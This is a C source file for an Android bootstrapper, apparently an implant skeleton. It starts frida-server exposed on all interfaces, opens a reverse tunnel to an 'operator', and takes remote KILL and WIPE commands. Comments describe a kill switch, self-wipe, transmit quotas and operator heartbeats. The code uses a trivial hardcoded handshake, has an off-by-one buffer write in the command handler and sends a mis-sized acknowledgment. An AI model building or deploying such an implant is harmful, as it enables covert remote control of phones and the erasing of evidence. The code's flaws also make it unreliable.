// File: c/bootstrapper/bootstrapper.c
// Bootstrapper ELF for Phone C - launches frida-server and establishes reverse tunnel

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>
#include <math.h>

#define FRIDA_SERVER_PATH "/data/local/tmp/frida-server"
#define FRIDA_SERVER_PORT 27042
#define TUNNEL_LISTEN_PORT 7080
#define OPERATOR_HOST "127.0.0.1"
#define OPERATOR_PORT 9090
#define MAX_BUFFER 4096

// Adaptive policy loop - magnetometer monitoring
void adaptive_policy_loop() {
    printf("Starting adaptive policy loop (magnetometer monitoring)...\n");
    
    while (1) {
        // In real implementation:
        // 1. Poll ASensorManager for magnetometer readings (10Hz)
        // 2. Compute field delta
        // 3. Expose proximity status on local port 7080
        // 4. Enforce max_transmits_per_hour, kill_switch, self_wipe_armed
        // 5. Heartbeat to operator
        
        sleep(60); // Check every minute
        
        // Simulate magnetometer reading
        double field = 45.0 + (rand() % 100) / 100.0; // microtesla
        printf("Magnetometer reading: %.2f uT\n", field);
        
        // If field change exceeds threshold, adjust symbol rate or trigger kill
        if (field > 50.0) {
            printf("High magnetic field detected - adjusting transmission parameters\n");
        }
    }
}

// Establish reverse tunnel to operator
int establish_reverse_tunnel() {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket");
        return -1;
    }
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(OPERATOR_PORT);
    inet_pton(AF_INET, OPERATOR_HOST, &addr.sin_addr);
    
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("connect");
        close(sock);
        return -1;
    }
    
    // PSK handshake (4-byte challenge/response)
    unsigned char challenge[4] = {0xDE, 0xAD, 0xBE, 0xEF};
    send(sock, challenge, 4, 0);
    
    unsigned char response[4];
    recv(sock, response, 4, 0);
    
    // Verify response matches expected (PSK-based)
    unsigned char expected[4] = {0xEF, 0xBE, 0xAD, 0xDE}; // Simplified
    if (memcmp(response, expected, 4) != 0) {
        printf("PSK handshake failed\n");
        close(sock);
        return -1;
    }
    
    printf("Reverse tunnel established to operator\n");
    
    // Proxy loop: forward between socket and local listener (port 7080)
    // This would typically be done in a separate thread
    // For now, we just return the socket
    return sock;
}

// Launch frida-server
pid_t launch_frida_server() {
    pid_t pid = fork();
    if (pid == 0) {
        // Child process
        execl(FRIDA_SERVER_PATH, "frida-server", "-l", "0.0.0.0:27042", NULL);
        perror("execl frida-server failed");
        exit(1);
    } else if (pid < 0) {
        perror("fork");
        return -1;
    }
    
    // Parent waits briefly to ensure server starts
    sleep(2);
    
    // Check if process is still alive
    int status;
    pid_t result = waitpid(pid, &status, WNOHANG);
    if (result == pid) {
        printf("frida-server failed to start\n");
        return -1;
    }
    
    printf("frida-server started (PID: %d)\n", pid);
    return pid;
}

// Handle commands from operator
void handle_operator_commands(int tunnel_sock) {
    unsigned char buffer[MAX_BUFFER];
    
    while (1) {
        int bytes = recv(tunnel_sock, buffer, MAX_BUFFER, 0);
        if (bytes <= 0) {
            break;
        }
        
        // Parse JSON command
        // {"action": "START_FRIDA|STOP_FRIDA|ROTATE_PSK|KILL|WIPE", "target": "pkg.name"}
        char* cmd_str = (char*)buffer;
        cmd_str[bytes] = '\0';
        
        if (strstr(cmd_str, "\"action\":\"START_FRIDA\"") || strstr(cmd_str, "\"action\": \"START_FRIDA\"")) {
            printf("Command: START_FRIDA\n");
            launch_frida_server();
        } else if (strstr(cmd_str, "\"action\":\"STOP_FRIDA\"") || strstr(cmd_str, "\"action\": \"STOP_FRIDA\"")) {
            printf("Command: STOP_FRIDA\n");
            // Kill frida-server
            system("pkill frida-server");
        } else if (strstr(cmd_str, "\"action\":\"ROTATE_PSK\"") || strstr(cmd_str, "\"action\": \"ROTATE_PSK\"")) {
            printf("Command: ROTATE_PSK\n");
            // Implement PSK rotation
        } else if (strstr(cmd_str, "\"action\":\"KILL\"") || strstr(cmd_str, "\"action\": \"KILL\"")) {
            printf("Command: KILL - terminating\n");
            exit(0);
        } else if (strstr(cmd_str, "\"action\":\"WIPE\"") || strstr(cmd_str, "\"action\": \"WIPE\"")) {
            printf("Command: WIPE - wiping sensitive data\n");
            // Remove /data/local/tmp/xbug-boot and other artifacts
            unlink("/data/local/tmp/xbug-boot");
            system("pkill frida-server");
        }
        
        // Send acknowledgment
        send(tunnel_sock, "{\"status\":\"ok\"}", 13, 0);
    }
}

int main(int argc, char* argv[]) {
    printf("BugXhunter Bootstrapper starting...\n");
    printf("Architecture: %s\n", sizeof(void*) == 8 ? "arm64" : "arm");
    
    // 1. Launch frida-server
    pid_t frida_pid = launch_frida_server();
    if (frida_pid < 0) {
        fprintf(stderr, "Failed to launch frida-server\n");
        return 1;
    }
    
    // 2. Try SSH reverse tunnel first
    int tunnel_sock = -1;
    
    // Check if /system/bin/ssh exists
    if (access("/system/bin/ssh", X_OK) == 0) {
        printf("SSH available - attempting SSH reverse tunnel\n");
        // Would execve /system/bin/ssh with -R 7081:localhost:7080 operator@operator-host
        // For now, fall back to raw TCP
    } else {
        printf("SSH not available - using raw TCP tunnel\n");
        tunnel_sock = establish_reverse_tunnel();
    }
    
    if (tunnel_sock < 0) {
        fprintf(stderr, "Failed to establish reverse tunnel\n");
        return 1;
    }
    
    // 3. Start adaptive policy loop in background
    pid_t policy_pid = fork();
    if (policy_pid == 0) {
        adaptive_policy_loop();
        exit(0);
    }
    
    // 4. Main loop: handle commands from operator
    handle_operator_commands(tunnel_sock);
    
    // Cleanup
    if (frida_pid > 0) {
        kill(frida_pid, SIGTERM);
    }
    if (policy_pid > 0) {
        kill(policy_pid, SIGTERM);
    }
    close(tunnel_sock);
    
    printf("Bootstrapper shutting down\n");
    return 0;
}
